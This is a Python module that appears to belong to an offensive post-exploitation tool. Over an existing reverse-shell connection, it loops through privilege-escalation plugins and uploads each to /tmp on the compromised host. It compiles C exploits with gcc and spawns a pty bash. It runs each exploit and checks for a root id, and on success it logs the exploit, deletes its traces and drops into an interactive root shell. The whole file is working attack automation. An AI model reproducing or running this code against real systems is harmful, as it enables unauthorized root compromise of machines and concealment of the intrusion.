import os
import rs_client
from time import sleep

def load_all_plugins(sock: rs_client.Socket, shell: rs_client.Shell, compromission_recap_file_name: str) -> None:
    """
    Run all available privesc plugins
    """
    print('[+] Identifying privesc capabilities')
    directory = './plugins/privesc/'
    counter = 1
    for filename in os.listdir(directory):
        f = os.path.join(directory, filename)
        if os.path.isfile(f):
            print('[+] Uploading privesc script number {}'.format(counter))
            rsh = rs_client.RSH(sock)
            if '.sh' in f:
                ext = '.sh'
            elif '.c' in f:
                ext = '.c'
            rsh.upload('{0}'.format(f), '/tmp/exploit{0}{1}'.format(counter, ext))
            sock.send('cd /tmp\n')
            if ext == '.c':
                sock.send('gcc exploit{0}{1} -o exploit{0}\n'.format(counter, ext))
                sock.send('chmod +x /tmp/exploit{0}{1}\n'.format(counter, ext))
                sock.send('./exploit{0}\n'.format(counter, ext))
            elif ext == '.sh':
                sock.send('chmod +x /tmp/exploit{0}{1}\n'.format(counter, ext))
                sock.send("""python3 -c 'import pty; pty.spawn("/bin/bash")'\n""")
                sock.send('./exploit{0}{1}\n'.format(counter, ext))
            sock.send("""/bin/sh -c '[ "$(id)" = "uid=0(root) gid=0(root) groups=0(root)" ] && touch /tmp/valid_root'\n""")
            sleep(2)
            if rsh.file_exists('/tmp/valid_root') == True:
                print('[+] Privesc exploit worked !')
                if compromission_recap_file_name:
                    with open(compromission_recap_file_name, 'a') as c:
                        c.write('## Vulnerability used for priviledge escalation\n`{}`\n'.format(f.split('/')[-1][:-3]))
                sleep(2)
                sock.send('rm /tmp/valid_root\n')
                sock.send('rm /tmp/exploit{0}{1}\n'.format(counter, ext))
                shell.interact()
                sock.close()
                print('before if')
            else:
                print("")
                sock.send('rm /tmp/exploit*\n') 
            counter += 1